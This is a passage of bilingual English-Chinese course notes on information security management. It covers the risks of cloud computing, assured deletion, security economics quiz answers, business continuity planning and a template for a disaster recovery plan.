(AWS).</p><blockquote><p>数据是远程存储和处理的。例子包括微软Azure和亚马逊网络服务（AWS）</p></blockquote><h4 id="Benefits-of-cloud-computing"><a href="#Benefits-of-cloud-computing" class="headerlink" title="Benefits of cloud computing"></a>Benefits of cloud computing</h4><ul><li>Companies have access to powerful computers that were previously out of reach or not cost-effective.</li><li>There is potentially infinite storage.</li><li>Rapid resource provisioning.</li></ul><blockquote><p>公司可以使用强大的计算机，而这些计算机在以前是遥不可及的，或者不符合成本效益<br>有潜在的无限的存储空间<br>快速的资源配置</p></blockquote><p>Legal implications</p><p>An organisation must fully assess the terms and conditions of the cloud computing provider, 必须全面评估云计算供应商的条款和条件 including researching the following questions:</p><p>What is the location of the servers?</p><p>The cloud provider’s servers must not be in an undesirable or legally problematic jurisdiction; Data Protection laws require organisations to verify this.</p><blockquote><p>云计算供应商的服务器不得位于不受欢迎或有法律问题的司法管辖区；数据保护法要求组织核实这一点</p></blockquote><p>Who has access to the information?</p><p>The cloud provider might be given important rights over the organisation, such as the right to use it commercially or disclose it to third parties.</p><blockquote><p>云提供商可能被赋予对组织的重要权利，如商业使用或向第三方披露的权利</p></blockquote><p>How can audits be performed?</p><p>Will it be possible for the organisation to audit the cloud provider with a view to ensuring that data is protected?</p><blockquote><p>组织是否有可能对云提供商进行审计，以确保数据得到保护？</p></blockquote><p>Are subcontractors involved?</p><p>That is, can the organisation restrict the cloud provider from outsourcing the work to one of their subcontractors?</p><blockquote><p>也就是说，该组织能否限制云提供商将工作外包给他们的某个分包商？</p></blockquote><h4 id="What-problems-can-arise-when-a-cloud-computing-provider-is-used"><a href="#What-problems-can-arise-when-a-cloud-computing-provider-is-used" class="headerlink" title="What problems can arise when a cloud computing provider is used?"></a>What problems can arise when a cloud computing provider is used?</h4><ol><li><p><strong>The cloud provider could be hacked</strong>. While the risk of protecting the data is outsourced to the provider, if the data is leaked it will also impact the organisation. A defence of ‘they were hacked, not us’ will not work. This is why risk is shared, and not transferred.</p><blockquote><p>云供应商可能被黑客攻击。虽然保护数据的风险被外包给了供应商，但如果数据被泄露，也会影响到组织。以 “他们被黑了，不是我们 “作为辩护理由是行不通的。这就是为什么风险是共享的，而不是转移的</p></blockquote></li><li><p><strong>Data is deleted (or lost)</strong>. There is no guarantee that the cloud provider is backing up the data, nor the results of computations.</p><blockquote><p>数据被删除（或丢失）。不能保证云供应商会备份数据，也不能保证计算结果</p></blockquote></li><li><p><strong>Data is not deleted appropriately</strong>. There is no guarantee that data will be completely removed from the cloud infrastructure when the client decides to delete data from the cloud.</p><blockquote><p>数据没有被适当地删除。当客户决定从云中删除数据时，不能保证数据会被完全从云基础设施中删除</p></blockquote></li></ol><h4 id="Conventional-and-cloud-based-storage-compared"><a href="#Conventional-and-cloud-based-storage-compared" class="headerlink" title="Conventional and cloud-based storage, compared"></a>Conventional and cloud-based storage, compared</h4><table><thead><tr><th align="left">Conventional</th><th align="left">Cloud-based</th></tr></thead><tbody><tr><td align="left">**Benefits:**organisations retain full end-to-end control of their service/data. 组织保留对其服务/数据的全部端到端控制</td><td align="left"><strong>Benefits:</strong> 1. this approach is cheaper than purchasing hardware and hiring staff to maintain it 2. speed of implementation: cloud systems can be deployed in a few hours (ie there is no delivery or set-up time). 1. 这种方法比购买硬件和雇佣员工来维护它更便宜 2. 实施速度：云系统可以在几小时内部署（即没有交付或设置时间）</td></tr><tr><td align="left"><strong>Disadvantages:</strong> 1. there is an overhead and financial cost for selecting, implementing, maintaining, securing and upgrading components 2. internal staff dedicated to protecting information are required. 1. 选择、实施、维护、保护和升级组件需要一定的开销和财务成本 2. 需要专门保护信息的内部人员</td><td align="left"><strong>Disadvantages:</strong> 1. shared risk with a trusted third party; managing the risk can be difficult 2. regulatory oversight is also a problem (as above). 1. 与受信任的第三方共享风险；管理风险可能很困难 2. 监管监督也是一个问题</td></tr></tbody></table><h4 id="Assured-deletion-in-the-Cloud"><a href="#Assured-deletion-in-the-Cloud" class="headerlink" title="Assured deletion in the Cloud"></a>Assured deletion in the Cloud</h4><p>Assured Deletion: “Rendering data completely irrecoverable”  使数据完全不可恢复</p><ul><li><p>Completely removing data from the storage media. </p></li><li><p>Making data inaccessible to anyone after it has been deemed deleted.</p></li></ul><p>Why </p><ul><li>Users want sensitive data that is no longer needed to be destroyed. </li><li>Cloud Providers may want assured deletion to comply with regulations – E.g. GDPR’s Right to be forgotten</li></ul><p>Normal deletion leaves data behind </p><p>Incompletely deleted data risks disclosure </p><p>Not a new problem, but more challenging - No access to the physical media! </p><p>Important issue, less attention - Difficult to completely delete data, New challenges, No building blocks</p><h4 id="Assured-deletion-Threat-–-Honest-Provider"><a href="#Assured-deletion-Threat-–-Honest-Provider" class="headerlink" title="Assured deletion Threat – Honest Provider"></a>Assured deletion Threat – Honest Provider</h4><ul><li>Provider is honest but prone to accidental data leaks. </li><li>Provider wants to provide complete deletion in order to comply with regulations and meet tenants requirements. </li><li>Malicious tenants probe resources for partially deleted data</li></ul><blockquote><ul><li>供应商是诚实的，但容易发生意外的数据泄漏。</li><li>提供者希望提供完全的删除，以遵守法规和满足租户的要求。</li><li>恶意租户探测资源以获取部分删除的数据</li></ul></blockquote><h5 id="Requirements-–-Honest-cloud-provider"><a href="#Requirements-–-Honest-cloud-provider" class="headerlink" title="Requirements – Honest cloud provider"></a>Requirements – Honest cloud provider</h5><p>Providing deletion should </p><ul><li>Not disrupt service availability </li><li>make data either inaccessible or completely remove it </li><li>affect all copies </li><li>be fine-grained </li><li>Take place immediately and without errors </li><li>Provable to users</li></ul><blockquote><ul><li><p>不破坏服务的可用性 </p></li><li><p>使数据无法访问或完全删除 </p></li><li><p>影响所有副本 </p></li><li><p>是细粒度的 </p></li><li><p>立即发生，没有错误 </p></li><li><p>可向用户证明</p></li></ul></blockquote><h5 id="Challenges-–-Honest-cloud-provider"><a href="#Challenges-–-Honest-cloud-provider" class="headerlink" title="Challenges – Honest cloud provider"></a>Challenges – Honest cloud provider</h5><p>Main cloud features pose different challenges </p><ul><li>Multiple copies of data </li><li>Virtualization </li><li>Multiple users – Data gets tangled together </li><li>Multiple components </li><li>Multiple logical layers </li><li>Underlying hardware – E.g., Different storage media – SSDs </li><li>Third-party and Offline backups – e.g., other services / tapes</li></ul><blockquote><ul><li>数据的多个副本 </li><li>虚拟化 </li><li>多个用户 - 数据被纠缠在一起 </li><li>多个组件 </li><li>多个逻辑层 </li><li>底层硬件 - 例如，不同的存储介质 - SSDs </li><li>第三方和离线备份 - 例如，其他服务/磁带</li></ul></blockquote><h5 id="Assured-deletion-Threat-–-Dishonest-Provider"><a href="#Assured-deletion-Threat-–-Dishonest-Provider" class="headerlink" title="Assured deletion Threat – Dishonest Provider"></a>Assured deletion Threat – Dishonest Provider</h5><p>Curious provider </p><ul><li>Tenants are suspicious about provider’s data disposal responsibilities </li><li>Tenants are aware of risks involved with incomplete deletion. </li><li>Tenants want assured deletion without incurring extra costs.</li></ul><blockquote><ul><li>租户对提供者的数据处理责任感到怀疑 </li><li>租户意识到不完全删除所涉及的风险。</li><li>租户希望在不产生额外费用的情况下保证删除</li></ul></blockquote><h3 id="Security-Economics"><a href="#Security-Economics" class="headerlink" title="Security Economics"></a>Security Economics</h3><p>Economics of security addresses individual and organizational decisions and behaviors with respect to security and privacy as market decisions.</p><blockquote><p>安全经济学涉及个人和组织在安全和隐私方面的决策和行为，是市场决策</p></blockquote><h3 id="Quiz-1"><a href="#Quiz-1" class="headerlink" title="Quiz"></a>Quiz</h3><h4 id="Q1-1"><a href="#Q1-1" class="headerlink" title="Q1"></a>Q1</h4><p>We don’t need to read the contents of an email to detect potential misuse or threat.</p><p>This is true - in general, analysing the metadata is sufficient. For example knowing the recipient of an email, time and frequency of communications, where did the sender connect from, etc, is usually enough to get a sense of what is going on without needing to read the actual message contents.</p><blockquote><p>一般来说，分析元数据就足够了。例如，知道电子邮件的收件人、通信的时间和频率、发件人是从哪里连接的等等，通常就足以让人了解发生了什么，而不需要阅读实际的信息内容</p></blockquote><h4 id="Q2-1"><a href="#Q2-1" class="headerlink" title="Q2"></a>Q2</h4><p>Natterjack蟾蜍欣赏小组（GANT）是一个保护小组，热衷于促进和保护Nutterjack蟾蜍的福祉。它是一个在英国注册的慈善机构，在全世界拥有大量的成员，他们都热衷于促进GANT的工作。</p><p>不幸的是，有关的蟾蜍是一种濒危物种，由于新地区的开发，它正逐渐被破坏。例如，由于开发工作，它在威尔士的一些地区已经局部灭绝，不得不重新引进。</p><p>该小组的所有信息都可以通过网络应用来获取，或者通过联系小组的名誉秘书简-皮博迪博士来获取纸质记录。这些信息包括该小组的成员记录、活动、会议地点、Natterjack Toad的栖息地、关于他们工作的保密方面等。</p><p>GANT are also exploring cloud computing, so that they could elastically expand the instances of their service as a way of replicating it and becoming less vulnerable to potential Denial of Service attacks. What would be the legal implications and security risks if GANT relied on cloud computing for their infrastructure?</p><blockquote><p>GANT也在探索云计算，这样他们就可以灵活地扩展他们的服务实例，作为一种复制的方式，不容易受到潜在的拒绝服务攻击。如果GANT的基础设施依赖云计算，会有什么法律影响和安全风险？</p></blockquote><p>Legal implications: They must consider the physical location of services (Data Protection Rules), access to information (cloud provider can read all data), if GANT can audit the cloud provider (verify if the cloud is keeping the data secure) and legal issues around the cloud providers sub-contractors.</p><blockquote><p>法律影响。他们必须考虑服务的物理位置（数据保护规则），对信息的访问（云供应商可以读取所有数据），GANT是否可以审计云供应商（验证云是否保持数据安全）以及围绕云供应商分包商的法律问题</p></blockquote><p>Security Risks: Cloud providers can be hacked and the information is leaked publicly. This is an example of risk-sharing as while the cloud provider is liable - the data leaked can be embarrassing to the organisation. Also the data can be deleted/lost if the cloud provider suffers a crash and does not keep regular backups. Or the data could not be deleted completely when needed.</p><blockquote><p>安全风险。云供应商可能被黑客攻击，信息被公开泄露。这是一个风险分担的例子，因为虽然云提供商有责任，但泄露的数据可能会使组织感到尴尬。另外，如果云提供商发生崩溃，并且没有保持定期备份，数据可能会被删除/丢失。或者在需要时不能完全删除数据</p></blockquote><h4 id="Q3-1"><a href="#Q3-1" class="headerlink" title="Q3"></a>Q3</h4><p>What is a <strong>moral hazard</strong>? Give an example showing how the concept applies to Information Security.</p><p>A moral hazard is a situation in which one party gets involved in a risky event knowing that it is protected against the risk.</p><p>In Information Security, this would apply when people engage in activities that can cause an Information Security risk thinking they are somehow protected.</p><p>For instance, one may engage with riskier and less secure websites thinking that the anti-malware they have installed will protect them.</p><blockquote><p>道德风险是一种情况，即一方知道自己受到保护，可以避免风险而参与到风险事件中。</p><p>在信息安全方面，这适用于人们从事可能导致信息安全风险的活动，认为他们在某种程度上得到了保护。</p><p>例如，人们可能会参与风险较高、安全性较低的网站，认为他们所安装的反恶意软件会保护他们。</p></blockquote><h4 id="Q4-1"><a href="#Q4-1" class="headerlink" title="Q4"></a>Q4</h4><p>What is a <em>Market for Lemons</em> and how does it apply to information security economics?</p><p>The <em>market for lemons</em> was an example introduced by Akerlof (Noble prize winner) in 1970 to explain the concept of asymmetric information in economics. It presents the following simple yet profound insight: suppose that there are 100 used cars for sale in a town: 50 well-maintained cars worth $2000 each, and 50 <em>lemons</em> (said of a car that turns out to have several manufacture defects not apparent to the buyer) worth $1000. The sellers know which is which, but the buyers don’t. What is the market price of a used car? You might think $1500; but at that price no good cars will be offered for sale. So the market price will be close to $1000. This is one reason poor security products predominate. When users can’t tell good from bad, they might as well buy a cheap antivirus product for $10 as a better one for $20, and we may expect a race to the bottom on price.</p><blockquote><p>柠檬市场是阿克洛夫（诺贝尔奖得主）在1970年提出的一个例子，用来解释经济学中不对称信息的概念。它提出了以下简单而深刻的见解：假设在一个城镇有100辆二手车出售。50辆维护良好的汽车，每辆价值2000美元，50辆柠檬车（说的是一辆车原来有几个制造缺陷，但对买方来说并不明显）价值1000美元。卖家知道哪个是哪个，但买家不知道。一辆二手车的市场价格是多少？你可能认为是1500美元；但在这个价格上，没有好的汽车会被出售。所以市场价格将接近1000美元。这就是劣质安全产品占主导地位的一个原因。当用户无法辨别好坏时，他们可能会买一个10美元的廉价杀毒产品，而买一个20美元的更好的产品，我们可以期待在价格上的竞争</p></blockquote><h2 id="Continuity-Management-and-Disaster-Recovery"><a href="#Continuity-Management-and-Disaster-Recovery" class="headerlink" title="Continuity Management and Disaster Recovery"></a>Continuity Management and Disaster Recovery</h2><h3 id="Business-continuity-management"><a href="#Business-continuity-management" class="headerlink" title="Business continuity management"></a>Business continuity management</h3><p>Business continuity management (BCM) is a holistic management process that identifies potential impacts that threaten an organisation and provides a framework for building resilience and capability for an effective response that safeguards the interests of its key stakeholders, reputation, brand and value creation activities.</p><blockquote><p>业务连续性管理（BCM）是一个整体的管理过程，它可以确定威胁到一个组织的潜在影响，并提供一个框架来建立弹性和能力，以作出有效的反应，保障其主要利益相关者的利益、声誉、品牌和价值创造活动</p></blockquote><p>There are several ways in which BCM relates to risk management:</p><ul><li>BCM needs may arise from wider business and Information Security risk assessments 业连管的需要可能产生于更广泛的业务和信息安全风险评估</li><li>the priorities of BCM must be defined by business managers and take into account the entirety of their business processes, similarly to risk management 业连管的优先事项必须由业务经理确定，并考虑到其整个业务流程，这与风险管理相似</li><li>BCM priorities are defined by a business impact assessment, which is similar to the impact assessment needed to calculate the asset value for risk assessment but with particularities when thinking about recovery for instance 业连管的优先事项是由业务影响评估确定的，这与计算风险评估的资产价值 所需的影响评估相似，但在考虑恢复问题时有其特殊性</li><li>risk management focuses on how to avoid, reduce, and transfer the risk of a threat materialising, while BCM focuses on how to recover once a threat materialises. 风险管理的重点是如何避免、减少和转移威胁发生的风险，而业连管的重点是一旦发生威胁如何恢复</li></ul><h4 id="Business-Continuity-Plan"><a href="#Business-Continuity-Plan" class="headerlink" title="Business Continuity Plan"></a>Business Continuity Plan</h4><p>A crucial part of BCM is the <strong>Business Continuity Plan</strong>, which is a three step process:</p><ol><li>Assigning responsibilities</li></ol><p>Ultimately, it will be senior management who must approve the plan. The main responsible person is likely to be an appointment at boardroom or executive level to oversee, and an appointment to take the programme forward.</p><blockquote><p>归根结底，必须由高级管理层批准该计划。主要责任人很可能是在董事会或执行层面上的任命，以监督，并任命其推动该计划的实施</p></blockquote><ol start="2"><li>Establishing and implementing the plan</li></ol><p>This includes defining the scope, aim and objectives, and the activities required if the plan is triggered – that is, what are the likely problems that will pop up? How can we deal with them?</p><blockquote><p>这包括定义范围、目的和目标，以及如果计划被触发所需的活动–也就是说，可能会冒出什么问题？我们如何处理它们？</p></blockquote><ol start="3"><li>Ongoing management</li></ol><p>Business continuity plans need to be regularly reviewed. This is because it could easily become out of date and no longer reflect real business operations.</p><blockquote><p>业务连续性计划需要定期审查。这是因为它很容易过时，不再能反映真实的业务运作</p></blockquote><p>In order to create an effective business continuity plan, we need to:</p><ul><li>understand the organisation and its risks, so this relates to risk management and assessment as seen in this module in previous weeks 了解组织及其风险，因此这与前几周本模块中的风险管理和评估有关</li><li>determine the BCM strategy, identifying the actions needed to maintain critical activities to support the organisation’s products and services 确定业连管战略，确定维持关键活动所需的行动，以支持该组织的产品和服务</li><li>develop and implement the BCM response, which includes answering questions such as: How do we meet our expected recovery times? What tactics can we deploy to protect resources? 制定并实施业连管对策，其中包括回答以下问题。我们如何满足我们的预期恢复时间？我们可以部署什么战术来保护资源？</li></ul><h4 id="Business-impact-analysis"><a href="#Business-impact-analysis" class="headerlink" title="Business impact analysis"></a>Business impact analysis</h4><p>Business impact analysis predicts the consequences of disruption of a business function and process, and gathers information needed to develop recovery strategies.</p><blockquote><p>业务影响分析预测了业务功能和流程中断的后果，并收集了制定恢复战略所需的信息</p></blockquote><p>First, list products that could be disrupted and for each identified product, consider the impact of disruption in terms of stakeholders and the organisation’s ability to meet its aims and objectives. Secondly, we need to figure out what the <strong>maximum length that the disruption can be managed</strong> without interrupting the business is. In other words, if a service or a product is disrupted, how long will it take for the disruption to be felt by the business in terms of profit, reputation, etc. We also need to identify the <strong>recovery time objective</strong> (RTO), which is a point in time at which each key product or service would need to be resumed in the event of a disruption.</p><blockquote><p>首先，列出可能被中断的产品，对于每个确定的产品，考虑中断对利益相关者的影响以及组织实现其目的和目标的能力。其次，我们需要弄清楚，在不中断业务的情况下，可以管理中断的最大长度是多少。换句话说，如果一项服务或一个产品被中断，企业需要多长时间才能在利润、声誉等方面感受到中断的影响。我们还需要确定恢复时间目标（RTO），即在发生中断的情况下，每个关键产品或服务需要恢复的时间点</p></blockquote><p>Finally, we need to identify the <strong>critical activities</strong> necessary to deliver the products and services. These are the activities that we need to protect and in order to do that we need to quantify the resources (people, premises, technology, information, suppliers, etc) required over time to maintain these activities at an acceptable level to and meet our RTO.</p><blockquote><p>最后，我们需要确定提供产品和服务所需的关键活动。这些是我们需要保护的活动，为了做到这一点，我们需要量化所需的资源（人员、场地、技术、信息、供应商等），以便将这些活动维持在一个可接受的水平，并满足我们的RTO</p></blockquote><p>The resources required after a disaster may be more than those required for day to day activity. No single individual is likely to know the whole plan, so a <strong>team or committee</strong> should be appointed for the whole organisation. This implies that the whole organisation should ideally be consulted about the plan through workshops, questionnaires, interviews and so on. It is perhaps better to think about the <strong>consequences</strong> rather than events when planning. For example, it is better to plan for ‘the office being damaged and no longer usable’, rather than a ‘burst main pipe’.</p><blockquote><p>灾难发生后所需的资源可能比日常活动所需的资源要多。没有一个人可能知道整个计划，所以应该为整个组织指定一个团队或委员会。这意味着，最好是通过研讨会、问卷调查、访谈等方式，就该计划咨询整个组织。在制定计划时，考虑后果而不是考虑事件也许更好。例如，最好是为 “办公室被损坏而无法使用 “做计划，而不是为 “水管爆裂 “做计划</p></blockquote><p>Determining your BCM strategy boils down to identifying the actions that need to be taken to maintain the critical activities that underpin the delivery of your organisation’s products and services.</p><blockquote><p>确定你的业连管战略可以归结为确定需要采取的行动，以维持支撑贵组织产品和服务交付的关键活动</p></blockquote><p>Put another way the strategy should show how to meet the RTO for each activity and what tactics to use to protect critical resources. The following questions may be useful when considering your options.</p><blockquote><p>换句话说，该战略应说明如何满足每项活动的RTO，以及使用什么策略来保护关键资源。在考虑你的选择时，以下问题可能是有用的</p></blockquote><h5 id="How-to-meet-the-RTO"><a href="#How-to-meet-the-RTO" class="headerlink" title="How to meet the RTO?"></a>How to meet the RTO?</h5><ul><li>What can we do to ensure the recovery time is satisfied?</li><li>Can we introduce new documentation for staff to read?</li><li>Do we need new procedures in place?</li></ul><h5 id="How-to-protect-crucial-resources"><a href="#How-to-protect-crucial-resources" class="headerlink" title="How to protect crucial resources?"></a>How to protect crucial resources?</h5><ul><li>Should we maintain the same technology at several locations?</li><li>How do we secure and keep copies of data necessary to our business operations?</li><li>What can our suppliers do to help?</li><li>How do we report everything to stakeholders?</li></ul><h4 id="Developing-and-implementing-the-business-continuity-plan"><a href="#Developing-and-implementing-the-business-continuity-plan" class="headerlink" title="Developing and implementing the business continuity plan"></a>Developing and implementing the business continuity plan</h4><p>It is common for the business continuity plan to be split into three separate documents:</p><ul><li>incident management</li><li>business continuity</li><li>business recovery</li></ul><p>For a small team it might make more sense to keep a single document instead.</p><p>Below you can see the outline of the recommended sections. 下面你可以看到推荐章节的大纲</p><h5 id="Purpose-scope-and-content"><a href="#Purpose-scope-and-content" class="headerlink" title="Purpose, scope and content"></a>Purpose, scope and content</h5><p>What is the plan going to cover? What is the scope (ie a single premise or building, whole operation, etc)? What is the document going to cover?</p><blockquote><p>该计划将涵盖什么？范围是什么（即单个场所或建筑、整个操作等）？文件将涵盖哪些内容？</p></blockquote><h5 id="Document-maintainer"><a href="#Document-maintainer" class="headerlink" title="Document maintainer"></a>Document maintainer</h5><p>You should document who owns the plan and who is responsible for reviewing, amending and updating it at regular intervals. A system of version control needs to be implemented.</p><blockquote><p>你应该记录谁拥有该计划，谁负责定期审查、修改和更新该计划。需要实施一个版本控制的系统</p></blockquote><h5 id="Plan-invocation"><a href="#Plan-invocation" class="headerlink" title="Plan invocation"></a>Plan invocation</h5><p>The method by which the plan is invoked should be clearly documented, setting out the individuals who have the authority to invoke the plan and under what circumstances. The plan should also set down the process for mobilising and standing down the relevant teams.</p><blockquote><p>应明确记录计划的调用方法，列出有权调用计划的个人以及在什么情况下调用。该计划还应该规定动员和解散相关团队的程序</p></blockquote><h5 id="Roles-and-responsibilities"><a href="#Roles-and-responsibilities" class="headerlink" title="Roles and responsibilities"></a>Roles and responsibilities</h5><p>The plan should list all individuals with a role in its implementation and explain that role.</p><blockquote><p>该计划应列出所有在计划实施中发挥作用的个人，并解释其作用</p></blockquote><h5 id="Incident-management"><a href="#Incident-management" class="headerlink" title="Incident management"></a>Incident management</h5><p>Document the required tasks to manage the initial phase of the incident and who is responsible for each task.  记录管理事件初始阶段所需的任务，以及每项任务的负责者 The tasks include:</p><ul><li>site evacuation and mobilisation of safety</li><li>first-aid or evacuation-assistance teams</li><li>locating and accounting for those who were on site and the immediate vicinity</li><li>ongoing employee and customer communications and safety briefings</li><li>up to date contract list and location of plan</li><li>identifying robust rooms to manage the incident.</li></ul><blockquote><p>现场疏散和动员安全人员<br>急救或疏散援助小组<br>定位和清点现场和附近的人员<br>持续的员工和客户沟通和安全简报<br>最新的合同清单和计划的位置<br>确定强大的房间来管理事件</p></blockquote><h5 id="Business-continuity-and-recovery"><a href="#Business-continuity-and-recovery" class="headerlink" title="Business continuity and recovery"></a>Business continuity and recovery</h5><p>In terms of business continuity and recovery the plan should:</p><ul><li>set out the critical activities to be recovered</li><li>the timescales in which they are to be recovered and the needed recovery levels</li><li>the resources available at different points in time to deliver your critical activities</li><li>the process for mobilising these resources and the detailed actions needed to ensure the continuity and recovery of your critical activities.</li></ul><blockquote><p>列出要恢复的关键活动<br>要恢复的时间范围和所需的恢复水平<br>在不同的时间点可用于开展关键活动的资源<br>调动这些资源的过程，以及为确保关键活动的连续性和恢复所需的详细行动</p></blockquote><h4 id="演习"><a href="#演习" class="headerlink" title="演习"></a>演习</h4><p>The plan must be <strong>exercised regularly</strong> in order to ensure that arrangements are reliable. Until the arrangements are tested we do not know if they are.</p><blockquote><p>该计划必须定期实施，以确保安排是可靠的。在对安排进行测试之前，我们不知道它们是否可靠</p></blockquote><p>Exercising involves validating the plans, rehearsing actions of key staff, and testing systems that are relied upon during an incident. The frequency of the exercises depends on the size of the organisation but should be no less than once a year as the exercises are likely to find weaknesses that need to be corrected.</p><blockquote><p>演习包括验证计划，演练关键人员的行动，以及测试事件发生时所依赖的系统。演习的频率取决于组织的规模，但应不少于每年一次，因为演习很可能会发现需要纠正的弱点</p></blockquote><p>Here are four common types of exercises:</p><h5 id="Discussion-based-exercises"><a href="#Discussion-based-exercises" class="headerlink" title="Discussion based exercises"></a>Discussion based exercises</h5><p>Bring staff together and inform them about their responsibilities. Discuss with staff to identify problems and solutions.</p><blockquote><p>把员工召集起来，让他们了解自己的责任。与员工讨论，找出问题和解决方案</p></blockquote><h5 id="Testing"><a href="#Testing" class="headerlink" title="Testing"></a>Testing</h5><p>Not everything can be tested, however, you can consider the contact list, activation process and the relied upon hardware such as communication lines, power supply, etc.</p><blockquote><p>不是所有的东西都可以测试，但是，你可以考虑联系名单、激活过程和所依赖的硬件，如通信线路、电源等</p></blockquote><h5 id="Table-top-exercise-ie-think-board-games"><a href="#Table-top-exercise-ie-think-board-games" class="headerlink" title="Table-top exercise (ie think board games)"></a>Table-top exercise (ie think board games)</h5><p>In this exercise, you bring staff together around a table to make decisions as events unfold in the same way as if the incident actually happened. This can take between a couple of hours and half a day. The benefit of this format is that it can generate high levels of realism and lets everyone know each other.</p><blockquote><p>在这种演习中，你把员工聚集在一张桌子旁，随着事件的发展做出决定，就像事件真的发生一样。这可能需要几个小时到半天的时间。这种形式的好处是，它可以产生高度的真实感，让每个人都了解对方。</p></blockquote><h5 id="Live-exercise"><a href="#Live-exercise" class="headerlink" title="Live exercise"></a>Live exercise</h5><p>Live exercises are necessary for some components such as evacuation that cannot be tested effectively in any other way. While single component tests are relatively simple to set up, full tests are much more complex and can be costly.</p><blockquote><p>现场演习对于一些不能以其他方式有效测试的部分，如疏散，是必要的。虽然单一成分测试的设置相对简单，但完整的测试要复杂得多，而且成本也很高</p></blockquote><h3 id="Disaster-recovery"><a href="#Disaster-recovery" class="headerlink" title="Disaster recovery"></a>Disaster recovery</h3><p>Disaster recovery is that part of business continuity that addresses the need to recover IT services, voice services and data following a business-threatening impact. It prioritises those services and information that are <strong>critical to the business</strong>. It includes planning for crisis situations and having in place the means to identify incidents, contain and recover them.</p><blockquote><p>灾难恢复是业务连续性的一部分，它解决了在业务受到威胁后恢复IT服务、语音服务和数据的需要。它将那些对业务至关重要的服务和信息列为优先事项。它包括对危机情况的规划，以及拥有识别事件、控制和恢复事件的手段</p></blockquote><p>The main goals for a disaster recovery plan are:</p><table><thead><tr><th align="left">To minimise interruptions to the normal operations</th><th>In other words to maintain business operations as normal.</th></tr></thead><tbody><tr><td align="left">To limit the extent of disruption and damage</td><td>A disaster can severely damage an organisation.</td></tr><tr><td align="left">To minimise the economic impact of the disaster</td><td>If you can’t access the office for a few weeks, can you still make a profit?</td></tr><tr><td align="left">To establish means of operations in advance</td><td>Signing contracts with backup establishments or keeping redundant copies of data for later use.</td></tr><tr><td align="left">To train personnel in emergency procedures</td><td>Where are the emergency procedures kept? What if they can’t be accessed?</td></tr><tr><td align="left">To provide smooth and rapid restoration of services</td><td>How to prevent long term fallout for the business?</td></tr></tbody></table><p>A disaster recovery plan usually mentions the following people, resources and activities.</p><ul><li><strong>IT services</strong><br>Which business processes are supported by which systems? What are the risks here?</li><li><strong>People</strong><br>Who are the stakeholders, on both the business and IT side, in any given disaster recovery process?</li><li><strong>Suppliers</strong><br>Which external suppliers would you need to contact in the event of an IT outage?</li><li><strong>Locations</strong><br>Where will you work if your normal premises are rendered inaccessible?</li><li><strong>Testing</strong><br>How will you test your disaster recovery plan? Will you simulate parts of it over the weekend?</li><li><strong>Training</strong><br>What training and documentation will be provided to end users?</li></ul><h4 id="A-disaster-recovery-plan-contents"><a href="#A-disaster-recovery-plan-contents" class="headerlink" title="A disaster recovery plan contents"></a>A disaster recovery plan contents</h4><p>Putting it all together, this is how you might structure the final document.</p><p>Introduction</p><p>A summary of the objectives and scope of the plan, including IT services and locations covered, the different services, and maintenance and testing activities. Also includes a revision history to track changes to the document.</p><blockquote><p>对计划的目标和范围的总结，包括涵盖的IT服务和地点，不同的服务，以及维护和测试活动。还包括一个修订历史，以跟踪文件的变化</p></blockquote><p>Roles and responsibilities</p><p>A list of the internal and external stakeholders involved in each DR process covered, complete with their contact details and a description of their duties.</p><blockquote><p>涵盖的每个DR流程所涉及的内部和外部利益相关者的列表，包括他们的详细联系方式和他们的职责描述</p></blockquote><p>Incident response</p><p>When should the plan be triggered, and how and when should employees, management, partners and customers be notified?</p><blockquote><p>什么时候应该触发该计划，以及如何和何时应该通知员工、管理层、合作伙伴和客户？</p></blockquote><p>Disaster recovery procedures</p><p>When the plan is triggered, the stakeholders can start to action the process for each affected IT service. These processes have to be set out step by step.</p><blockquote><p>当计划被触发时，利益相关者可以开始对每个受影响的IT服务的流程采取行动。这些程序必须一步一步地制定出来</p></blockquote><p>Appendices</p><p>A collection of any other lists, forms and documents relevant to the disaster recovery plan, such as details on alternate work locations, insurance policies, and the storage and distribution of disaster recovery resources.</p><blockquote><p>与灾难恢复计划相关的任何其他清单、表格和文件的集合，例如关于备用工作地点、保险政策以及灾难恢复资源的存储和分配的细节</p></blockquote><h4 id="Disaster-recovery-plan-example"><a href="#Disaster-recovery-plan-example" class="headerlink" title="Disaster recovery plan example"></a>Disaster recovery plan example</h4><p>What if the office is no longer accessible due to weather (flood) or other threats (terrorist attack)? 如果办公室由于天气（洪水）或其他威胁（恐怖袭击）而无法再进入，怎么办？</p><p>One response might be to move the team to a mobile site such as a trailer while the office is out of action. How do we plan for such an eventuality? 一种应对措施可能是在办公室停止工作时，将团队转移到一个移动的地方，如拖车。我们如何为这种可能的情况做计划？</p><p>Step 1: Notify senior management and prepare purchase for backup equipment 通知高级管理层，准备购买备用设备</p><ol><li>Notify _______ of the nature of the disaster and the need to select the mobile site plan. 通知_______ 灾害的性质和选择移动站点计划的必要性</li><li>Confirm in writing the substance of the telephone notification to _______ within 48 hours of the telephone notification. 在电话通知的48小时内以书面形式确认电话通知的内容，_______</li><li>Confirm all needed backup media are available to load the backup machine. 确认所有需要的备份介质都可以装入备份机</li><li>Prepare a purchase order to cover the use of backup equipment. Notify _______ of plans for a trailer and its placement. 准备一份采购订单，以涵盖备份设备的使用。通知_______ 有关拖车的计划和安置</li></ol><p>Step 2: Do communication lines/channels need to be re-routed? 通信线路/渠道是否需要改道？</p><ol><li><p>Depending on communication needs, notify the telephone company _______ of possible emergency line changes. 根据通信需要，通知电话公司_______，可能的紧急线路改变</p></li><li><p>Begin setting up power and communications at <em><strong><strong><strong>. 开始设置电源和通信，</strong></strong></strong></em></p></li><li><ol><li>Power and communications are prearranged to hook into when the trailer arrives. 电力和通讯都是预先安排好的，在拖车到达时挂上</li><li>At the point where telephone lines come into the building (<em><strong><strong><strong>) break the current linkage to the administration controllers (</strong></strong></strong></em>). 在电话线进入大楼的地方(<em><strong><strong><strong>)，切断目前与行政部门控制器的联系(</strong></strong></strong></em>)</li><li>These lines are rerouted to lines going to the mobile site. They are linked to modems at the mobile site. 这些线路被改道为通往移动站点的线路。它们被连接到移动站点的调制解调器上</li><li>The lines currently going from _______ to _______ would then be linked to the mobile unit via modems. 目前从_______ 到_______ 的线路将通过调制解调器连接到移动装置</li><li>This can conceivably require _______ to redirect lines at _______ to a more secure area in case of disaster. 可以想象，这需要_______，在发生灾难时将线路重新定向到一个更安全的地方</li></ol></li></ol><p>Step 3: Get mobile site up and running! 让移动站点启动和运行!</p><ol><li><p>When the trailer arrives, plug into power and do necessary checks. 